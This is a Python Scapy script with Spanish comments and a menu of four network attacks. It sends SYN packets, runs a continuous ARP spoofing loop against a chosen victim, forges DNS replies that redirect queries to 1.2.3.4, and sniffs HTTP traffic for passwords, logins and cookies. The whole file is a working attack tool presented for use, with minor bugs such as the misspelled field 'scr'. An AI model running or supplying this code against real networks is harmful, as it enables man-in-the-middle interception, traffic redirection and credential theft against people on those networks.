from scapy.all import IP, TCP, send, getmacbyip, ARP, DNSQR, UDP, DNS, DNSRR, Raw, sniff
import os
import time

#Esta funcio es para inviar un syn falso

def syn_falso(target_ip, port):
    ip = IP(dst=target_ip)
    tcp = TCP(dport=port, flags="S")
    pkt = ip/tcp
    send(pkt, verbose=0)
    print(f"Enviando SYN falso a {target_ip}:{port}")

# Esta funcion sirve para una respuesta falsa de ARP
def arp_spoof(victim_ip, spoof_ip):
    mac_vic = getmacbyip(victim_ip)
    if not mac_vic:
        print("No se pudo obtener MAC de {victim_ip}")
        return

    pkt = ARP(op=2, pdst=victim_ip, psrc=spoof_ip, hwdst=mac_vic)
    send(pkt, verbose=0)
    print(f"Enviando ARP falsa a {victim_ip} (pasandose por {spoof_ip})")

#spoofing de DNS modo escucha
def dns_spoof(pkt):
    if   pkt.haslayer(DNSQR):
        pkt_spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst)/ \
                      UDP(dport=pkt[UDP].sport, sport=53)/ \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="1.2.3.4"))
                      
        send(pkt_spoofed, verbose=0)
        print(f"Respuesta falsa de DNS a {pkt[IP].scr}")
        
def capturar_en_http(pkt):
    if pkt.haslayer(Raw):
        montar = pkt[Raw].load.decode(errors="ignore")
        if "password" in montar or "passwd" in montar or "login" in montar or "cookie" in montar:
            print(f"Informacion sensible: {montar}")
            
if __name__ == "__main__":
    print("==Ataques==")
    print("1. SYN falso")
    print("2. ARP spoofing")
    print("3. DNS spoofing")
    print("4. capturar contraseña HTTP")
    
    opcion = input("Ingrese una opcion(#)")
    
    if opcion == "1":
        ip = input("IP victima: ")
        puerto = int(input("puerto destino: "))
        for x in range(10):
            syn_falso(ip, puerto)
            time.sleep(1)
    
    elif opcion == "2":
        victima = input("IP victima: ")
        suplantar = input("IP a suplantar: ")
        while True:
            arp_spoof(victima, suplantar)
            time.sleep(2)
            
    elif opcion == "3":
        print("Escuchando trafico de DNS (SALIDA en 30s)")
        paquetes = sniff(filter="udp port 53", prn=dns_spoof, timeout=30, store=0)
        print(f"Captura finalidad. {len(paquetes)} paquetes analizados")
            
    elif opcion == "4":
        print("Escuchando trafico de HTTP (SALIDA en 30s)")
        paquetes = sniff(filter="tcp port 80", prn=capturar_en_http, timeout=30, store=0)
        print(f"Captura finalidad. {len(paquetes)} paquetes analizados")
    else:
        print("Opcion invalida")